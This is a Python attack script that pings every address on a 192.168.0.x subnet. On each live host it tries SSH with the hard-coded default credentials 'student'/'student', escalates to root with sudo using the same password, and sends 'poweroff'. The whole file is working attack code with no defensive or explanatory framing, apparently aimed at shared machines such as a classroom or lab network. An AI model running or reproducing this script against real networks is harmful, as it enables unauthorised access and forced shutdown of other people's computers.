#!/usr/bin/python3
import subprocess,os,threading,time
from queue import Queue
import paramiko
from paramiko.channel import Channel
import time

# Initalizing Important Varibles
ssh = paramiko.SSHClient()
ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
yourIP = input("Your IP: ")
beginningOfIP = "192.168.0."
# Swing Hammer ========================================================================
def hammer(ip):
        channel:Channel = ssh.invoke_shell()
        print(type(channel))
        channel_data = str()
        while True:
                if channel.recv_ready():
                     print(beginningOfIP +  ip +  " Sucessfully Connected Through SSH")
                else:
                     continue
                channel.send("sudo su\n")
                time.sleep(0.1)
                channel.send("student\n")
                time.sleep(0.1)
                print("Logged in as Root")
                channel.send("poweroff\n")
                time.sleep(0.1)
                channel_data += str(channel.recv(999))
                time.sleep(0.2)
                channel.send("^c\n")
                ssh.close()
                break
        print("Computer is off")

# Finding Mole ===============================================================================================
lock=threading.Lock()
_start=time.time()
def check(n):
        if str(n) != '54':
                if yourIP != str(n):
                        if str(n) != '197':
                                with open(os.devnull, "wb") as limbo:
                                        ip=str(beginningOfIP) + str(n)
                                        result=subprocess.Popen(["ping", "-c", "1", "-w", "1", ip],stdout=limbo, stderr=limbo).wait()
                                        with lock:
                                                if result == 0:
                                                        print (ip +  " active")
                                                        try:
                                                                ssh.connect(ip, username='student', password='student')
                                                                print(ip +  " Was Sucessfull After Attempt To Connect <----------------------")
                                                                hammer(str(n))
                                                        except:
                                                                print(ip + " Wasn't Sucessfull After Attempt To Connect")
                                                else:
                                                        pass

def threader():
    while True:
        worker=q.get()
        check(worker)
        q.task_done()
q=Queue()

for x in range(255):
    t=threading.Thread(target=threader)
    t.daemon=True
    t.start()
for worker in range(1,255):
    q.put(worker)
q.join()
print("Process completed in: ",time.time()-_start)
